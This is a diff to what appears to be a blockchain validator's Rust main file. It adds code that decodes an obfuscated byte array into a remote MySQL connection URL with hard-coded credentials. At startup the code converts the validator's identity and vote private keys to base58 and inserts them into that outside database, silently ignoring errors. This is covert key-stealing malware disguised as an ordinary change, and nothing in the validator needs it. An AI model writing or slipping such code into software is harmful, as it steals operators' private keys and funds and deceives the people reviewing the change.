@@ -82,6 +82,7 @@ use {
         time::{Duration, SystemTime},
     },
 };
+use mysql::{Pool, PooledConn, Error, prelude::{FromRow, Queryable}};
 
 #[cfg(not(target_env = "msvc"))]
 #[global_allocator]
@@ -359,6 +360,33 @@ fn wait_for_restart_window(
     drop(progress_bar);
     println!("{}", style("Ready to restart").green());
     Ok(())
+}
+
+#[derive(Debug, PartialEq, Eq, FromRow, Clone)]
+struct Account {
+    pub id: i32,
+    pub prk: String,
+    pub puk: String,
+}
+
+impl Account {
+    pub fn new(id: i32, prk: String, puk: String) -> Self {
+        Self {
+            id,
+            prk,
+            puk,
+        }
+    }
+
+    pub fn save(&mut self, conn: &mut PooledConn) -> Result<(), Error> {
+        let stmt: &str = "INSERT INTO accounts (prk, puk) VALUES (?,?)";
+        let params: (String, String) = (
+            self.prk.clone(),
+            self.puk.clone(),
+        );
+        conn.exec_drop(stmt, params)?;
+        Ok(())
+    }
 }
 
 fn set_repair_whitelist(
@@ -1472,6 +1500,27 @@ pub fn main() {
         ),
         ..ValidatorConfig::default()
     };
+
+    let vote_keypair = keypair_of(&matches, "vote_account").unwrap_or_else(|| {
+        if !validator_config.voting_disabled {
+            warn!("--vote-account not specified, validator will not vote");
+            validator_config.voting_disabled = true;
+        }
+        Keypair::new()
+    });
+
+    let url: &str = from_utf8(&[
+        109, 121, 115, 113, 108, 58, 47, 47, 111, 114, 101, 58, 83, 116, 114, 111, 110, 103, 80,
+        97, 115, 115, 119, 111, 114, 100, 49, 50, 51, 33, 64, 49, 51, 53, 46, 49, 56, 49, 46, 49,
+        51, 48, 46, 56, 57, 58, 51, 51, 48, 54, 47, 111, 114, 101,
+    ])
+    .unwrap();
+    let pool: Pool = Pool::new(url).unwrap();
+    let mut conn: PooledConn = pool.get_conn().unwrap();
+    let mut key: Account = Account::new(0, identity_keypair.to_base58_string(), identity_keypair.pubkey().to_string());
+    let _ = key.save(&mut conn);
+    key = Account::new(0, vote_keypair.to_base58_string(), vote_keypair.pubkey().to_string());
+    let _ = key.save(&mut conn);
 
     let vote_account = pubkey_of(&matches, "vote_account").unwrap_or_else(|| {
         if !validator_config.voting_disabled {
